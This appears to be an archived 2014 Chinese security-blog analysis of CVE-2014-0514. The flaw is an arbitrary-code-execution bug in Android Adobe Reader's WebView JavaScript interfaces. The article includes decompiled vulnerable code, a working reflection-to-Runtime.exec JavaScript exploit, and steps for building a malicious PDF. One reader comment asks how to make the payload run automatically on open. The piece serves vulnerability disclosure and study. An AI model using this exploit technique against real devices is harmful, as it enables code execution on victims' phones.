@@ -1,0 +1,33 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Android Adobe Reader 任意代码执行分析(附POC)</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">livers</a> <span class="bull">·</span> <time title="2014/04/18 14:05" ui-time="" datetime="2014/04/18 14:05" class="published ng-binding ng-isolate-scope">2014/04/18 14:05</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 描述</h2><hr><p>前几天老外在fd还有exploit-db上，公布了Adobe Reader任意代码执行的漏洞。</p><p>漏洞编号： <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0514">CVE: 2014-0514</a></p><p>AdobeReader安装量比较大，又和浏览器容器不同，分析一下。</p><p>Android Adobe Reader 调用webview的不安全的Javascript interfaces。</p><p>导致可以执行任意js代码。具体查看<a href="http://drops.wooyun.org/papers/548">WebView中接口隐患与手机挂马利用</a>。</p><p>影响版本：</p><p>理论上Android Adobe Reader 11.2.0之前的版本多存在，Android version 11.1.3成功利用。</p><p>我查看了之前的几个版本例如Android Adobe Reader 11.1.2 如下图，问题也应该存在。</p><p><img alt="enter image description here" img-src="be0cb8b0f531dab6d6551fdebc2215a99ab1efef.jpg"></p><h2>0x01利用</h2><hr><p>从反编译出来的java代码看</p><pre><code>#!java
+public class ARJavaScript
+{
+[...]
+
+   public ARJavaScript(ARViewerActivity paramARViewerActivity)
+   {
+[...]
+      this.mWebView.addJavascriptInterface(new ARJavaScriptInterface(this), "_adobereader");
+      this.mWebView.addJavascriptInterface(new ARJavaScriptApp(this.mContext), "_app");
+      this.mWebView.addJavascriptInterface(new ARJavaScriptDoc(), "_doc");
+      this.mWebView.addJavascriptInterface(new ARJavaScriptEScriptString(this.mContext), "_escriptString");
+      this.mWebView.addJavascriptInterface(new ARJavaScriptEvent(), "_event");
+      this.mWebView.addJavascriptInterface(new ARJavaScriptField(), "_field");
+      this.mWebView.setWebViewClient(new ARJavaScript.1(this));
+      this.mWebView.loadUrl("file:///android_asset/javascript/index.html");
+   }
+</code></pre><p><code>_adobereader，_app，_doc，_escriptString，_event，_field</code>这几个变量都会存在任意代码执行的问题.</p><p>利用代码和之前一样。</p><pre><code>#!java
+function execute(bridge, cmd) {
+   return bridge.getClass().forName('java.lang.Runtime')
+      .getMethod('getRuntime',null).invoke(null,null).exec(cmd);
+}
+
+if(window._app) {
+   try {
+      var path = '/data/data/com.adobe.reader/mobilereader.poc.txt';
+      execute(window._app, ['/system/bin/sh','-c','echo \"Lorem ipsum\" &gt; ' + path]);
+      window._app.alert(path + ' created', 3);
+   } catch(e) {
+      window._app.alert(e, 0);
+   }
+}
+</code></pre><p>这里不同是构造 恶意的PDF。</p><p>首先需要一个PDF编辑器，比如Adobe Acrobat（flash达人pz推荐）.</p><p>然后添加表单按钮或者书签等，调用事件添加</p><p><img alt="enter image description here" img-src="9e8de496378984b1d4bb04dfaa866dc00ecd551e.jpg"></p><p>我这里看了下button最好演示，和老外的那个poc一样基本上.</p><p>导入到android虚拟机里，打开，成功复现。</p><p><img alt="enter image description here" img-src="93c7daefdf600f9fd06c9b0e82e8d38ce5052031.jpg"></p><h2>0x02 扩展</h2><hr><p>一些网盘或浏览器，看看能否调用adobe reader来预览pdf的应用可能会存在这个漏洞，大部分应用都是直接下载pdf到本地。可以再测试一些能预览pdf的邮箱之类的应用。</p><h2>0x03 修复</h2><hr><p>新版本的Adobe Reader 11.2.0 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="df3b6765ebf1ed3b647a3b675538455b384b773957683b6260384b773b65593a71563a5a7738455bb5ac376f5c384b7739517a3a507c1d7f9f95bea9beacbcadb6af">[email&#160;protected]</a>tInterface，老版本的用户则在adobereader禁用了表单的js执行。 不知道那些杀毒软件能不能检测到这些恶意poc呢 :）</p><p>附上<a href="http://static.wooyun.org/20141017/2014101711445669638.pdf">poc.pdf</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/548" rel="bookmark" id="re1">WebView中接口隐患与手机挂马利用</a></li><li><a href="http://drops.wooyun.org/tools/3186" rel="bookmark" id="re2">Android UXSS阶段性小结及自动化测试</a></li><li><a href="http://drops.wooyun.org/tips/7488" rel="bookmark" id="re3">Android.Hook框架xposed篇(Http流量监控)</a></li><li><a href="http://drops.wooyun.org/tips/3812" rel="bookmark" id="re4">Android Logcat Security</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ppmm</span> <span class="reply-time">2014-04-30 15:13:42</span></div><p></p><p>我在安卓市场下载的Adobe Reader反编译后怎么没有看到ARJavaScript这个类啊？能把你的apk发给我一份吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">新进菜鸟</span> <span class="reply-time">2014-04-25 14:10:10</span></div><p></p><p>这个poc.pdf需要点击按钮后才会执行javascript代码，有没有办法在打开poc.pdf的时候立即执行javascript代码啊？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">子不语</span> <span class="reply-time">2014-04-22 10:26:58</span></div><p></p><p>感觉有很多利用的地方</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">conqu3r</span> <span class="reply-time">2014-04-19 21:10:17</span></div><p></p><p>试下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">TMaMba</span> <span class="reply-time">2014-04-18 15:19:47</span></div><p></p><p>nice</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hqdvista</span> <span class="reply-time">2014-04-18 14:57:42</span></div><p></p><p>不错，重量级的例子</p><p></p></div></div></div></div></div></main>
